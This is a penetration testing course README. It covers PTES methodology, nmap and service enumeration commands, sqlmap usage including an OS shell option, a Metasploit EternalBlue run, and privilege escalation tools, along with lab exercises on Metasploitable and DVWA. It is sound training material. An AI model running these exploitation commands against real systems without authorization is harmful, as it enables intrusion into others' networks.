# Penetration Testing - Methodology and Exercises

This directory contains resources for learning structured penetration testing methodology, tool usage, and practical exercises.

---

## Learning Objectives

By completing exercises in this section, you will be able to:
- Follow a structured penetration testing methodology
- Perform reconnaissance and information gathering
- Conduct vulnerability assessment and exploitation
- Document findings in professional reports

---

## Directory Structure

```
Penetration_Testing/
|-- README.md                   # This file
|-- Reconnaissance/             # Information gathering
|   |-- passive/                # OSINT techniques
|   |-- active/                 # Scanning and enumeration
|
|-- Exploitation/               # Exploitation techniques
|   |-- web/                    # Web application attacks
|   |-- network/                # Network service exploitation
|   |-- windows/                # Windows-specific exploits
|   |-- linux/                  # Linux-specific exploits
|
|-- Post_Exploitation/          # After initial access
|   |-- privilege_escalation/   # Privesc techniques
|   |-- persistence/            # Maintaining access
|   |-- lateral_movement/       # Moving through network
|
|-- Exercises/                  # Structured labs
```

---

## Penetration Testing Methodology

### PTES Framework (Penetration Testing Execution Standard)

```
1. Pre-engagement Interactions
   - Scope definition
   - Rules of engagement
   - Authorization documentation

2. Intelligence Gathering
   - Passive reconnaissance (OSINT)
   - Active reconnaissance (scanning)

3. Threat Modeling
   - Identify valuable assets
   - Document attack vectors

4. Vulnerability Analysis
   - Automated scanning
   - Manual testing
   - False positive validation

5. Exploitation
   - Validate vulnerabilities
   - Gain initial access
   - Document proof of concept

6. Post-Exploitation
   - Privilege escalation
   - Lateral movement
   - Data identification

7. Reporting
   - Executive summary
   - Technical findings
   - Remediation recommendations
```

---

## Reconnaissance Phase

### Passive Reconnaissance (OSINT)

| Technique | Tools | Information Gathered |
|-----------|-------|---------------------|
| DNS enumeration | dig, nslookup, dnsenum | Subdomains, mail servers |
| WHOIS lookup | whois, amass | Registration info, contacts |
| Search engines | Google dorks, Shodan | Exposed systems, documents |
| Social media | LinkedIn, Twitter | Employee names, tech stack |
| Code repositories | GitHub, GitLab | Credentials, configurations |

**Google Dorks Examples:**
```
site:target.com filetype:pdf
site:target.com inurl:admin
site:target.com intitle:"index of"
site:github.com "target.com" password
```

### Active Reconnaissance

**Nmap Scanning Patterns:**
```bash
# Discovery scan
nmap -sn 192.168.1.0/24

# Quick port scan
nmap -F 192.168.1.100

# Full TCP scan with service detection
nmap -sC -sV -p- -oA full_scan 192.168.1.100

# UDP scan (slow but important)
nmap -sU --top-ports 100 192.168.1.100

# Aggressive scan (noisy, good for CTF)
nmap -A 192.168.1.100

# Stealth scan
nmap -sS -T2 --scan-delay 1s 192.168.1.100
```

**Service Enumeration:**
```bash
# SMB enumeration
enum4linux -a 192.168.1.100
smbclient -L //192.168.1.100/ -N
crackmapexec smb 192.168.1.100

# Web enumeration
nikto -h http://192.168.1.100
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://192.168.1.100 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

# SNMP enumeration
snmpwalk -v2c -c public 192.168.1.100
```

---

## Exploitation Phase

### Web Application Attacks

| Attack | Description | Tools |
|--------|-------------|-------|
| SQL Injection | Database manipulation | SQLmap, manual testing |
| XSS | Script injection | Burp Suite, manual |
| Command Injection | OS command execution | Manual, commix |
| File Inclusion | LFI/RFI | Manual, Burp |
| Authentication Bypass | Login circumvention | Burp Suite, manual |

**SQLmap Usage:**
```bash
# Basic test
sqlmap -u "http://target/page?id=1"

# With POST data
sqlmap -u "http://target/login" --data="user=admin&pass=test"

# Database enumeration
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables

# OS shell (if vulnerable)
sqlmap -u "http://target/page?id=1" --os-shell
```

### Network Service Exploitation

**Metasploit Framework:**
```bash
# Start Metasploit
msfconsole

# Search for exploits
search type:exploit platform:windows smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Post-exploitation
sessions -l
sessions -i 1
```

### Common Vulnerable Services

| Service | Port | Common Vulnerabilities |
|---------|------|----------------------|
| SMB | 445 | EternalBlue, null sessions |
| RDP | 3389 | BlueKeep, weak credentials |
| SSH | 22 | Weak credentials, old versions |
| FTP | 21 | Anonymous access, weak creds |
| HTTP | 80/443 | Web app vulnerabilities |
| MySQL | 3306 | Default credentials, injection |

---

## Post-Exploitation Phase

### Windows Privilege Escalation

**Automated Enumeration:**
```powershell
# WinPEAS
.\winPEAS.exe

# PowerUp
. .\PowerUp.ps1
Invoke-AllChecks

# Windows Exploit Suggester
systeminfo > sysinfo.txt
# Transfer to Kali
python windows-exploit-suggester.py --database 2024-01-01-mssb.xls --systeminfo sysinfo.txt
```

**Common Windows PrivEsc Vectors:**
- Unquoted service paths
- Weak service permissions
- AlwaysInstallElevated
- Stored credentials
- Token impersonation
- Kernel exploits

### Linux Privilege Escalation

**Automated Enumeration:**
```bash
# LinPEAS
./linpeas.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh

# LinEnum
./LinEnum.sh -t
```

**Common Linux PrivEsc Vectors:**
- SUID binaries
- Sudo misconfigurations
- Cron job abuse
- Writable PATH
- Kernel exploits
- Docker escape

---

## Exercises

### Exercise 1: Full Scan Methodology
**Difficulty:** Beginner
**Time:** 2 hours

1. Set up a target VM (Metasploitable or similar)
2. Perform discovery scan
3. Full port scan with service detection
4. Enumerate discovered services
5. Document all findings

### Exercise 2: Web Application Testing
**Difficulty:** Intermediate
**Time:** 3 hours

1. Deploy DVWA in lab
2. Test each vulnerability category
3. Document exploitation steps
4. Write remediation recommendations

### Exercise 3: Complete Penetration Test
**Difficulty:** Advanced
**Time:** 4-8 hours

1. Target: Metasploitable 3 or HTB machine
2. Full reconnaissance
3. Vulnerability identification
4. Exploitation and access
5. Privilege escalation
6. Complete pentest report

---

## Intentionally Vulnerable Systems

### For Practice
- **Metasploitable 3:** https://github.com/rapid7/metasploitable3
- **VulnHub:** https://www.vulnhub.com
- **HackTheBox:** https://www.hackthebox.com
- **TryHackMe:** https://tryhackme.com
- **DVWA:** https://github.com/digininja/DVWA
- **WebGoat:** https://owasp.org/www-project-webgoat/

---

## Resources

### Cheat Sheets
- https://book.hacktricks.xyz - Comprehensive methodology
- https://github.com/swisskyrepo/PayloadsAllTheThings - Payload repository
- https://gtfobins.github.io - Linux privilege escalation
- https://lolbas-project.github.io - Windows LOLBins

### Wordlists
- SecLists: https://github.com/danielmiessler/SecLists
- RockYou: /usr/share/wordlists/rockyou.txt (Kali)

---

*Always obtain proper authorization before testing. Document everything for learning and reporting.*
